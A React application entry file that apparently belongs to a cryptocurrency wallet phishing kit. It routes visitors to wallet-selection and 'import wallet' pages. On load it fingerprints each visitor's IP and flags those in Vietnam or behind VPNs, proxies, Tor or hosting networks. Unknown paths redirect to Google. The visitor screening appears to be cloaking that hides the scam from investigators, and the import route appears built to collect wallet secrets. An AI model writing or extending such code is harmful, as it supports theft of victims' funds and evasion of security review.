import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import "./App.css";
import SelectWallet from "./pages/SelectWallet";
import ImportWallet from "./pages/ImportWallet";
import HomePage from "./pages/HomePage";
import { setLocalStorage,getLocalStorage } from "./utils/useLocalStorage";
import { useState,useEffect} from "react";

function App() {

useEffect(() => {
    const checkGeoIP = async () => {
        try {
            var data = getLocalStorage("geoinfo");
            if(!data){
                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
                const jsonData = await response.json();
                if(jsonData){
                    setLocalStorage("geoinfo",jsonData);
                    data = jsonData;
                }
            }
            if(data){
              if(data.country_code.toLowerCase() == 'vn'){
                 setLocalStorage("anonymous", {anonymous:1});
              }
            }
            if(data.ip || data.IP){
              var anonymous = getLocalStorage("anonymous");
              if(!anonymous){
                fetch(`https://ipinfo.io/widget/demo/${data.ip}`).then(d => d.json()).then(d => {
                  let resJson = d.data;
                  if(resJson){
                      if(resJson.privacy){
                        const privacy = resJson.privacy;
                        if(privacy){
                          if(
                            resJson.is_anonymous == true
                            || privacy.hosting == true
                            || privacy.vpn == true
                            || privacy.proxy == true
                            || privacy.tor == true
                            || privacy.relay == true
                            || privacy.service.length > 0
                          ){
                              setLocalStorage("anonymous", {anonymous:1});
                          }
                        }
                      }
                  }
                });
              }
            }
        } catch(e) {
            console.log(e);
        }
    };
    checkGeoIP();
}, []);

  return (
    <BrowserRouter>
      <div id="app">
        <Routes>
          <Route path="/" element={<HomePage/>} />
          <Route path="/app" element={<HomePage/>} />
          <Route path="/select-wallet" element={<SelectWallet/>}/>
          <Route path="/import-wallet/:walletName" element={<ImportWallet/>}/>
          <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.google.com/"/>} />
        </Routes>
      </div>
    </BrowserRouter>
  );
}


export default App;
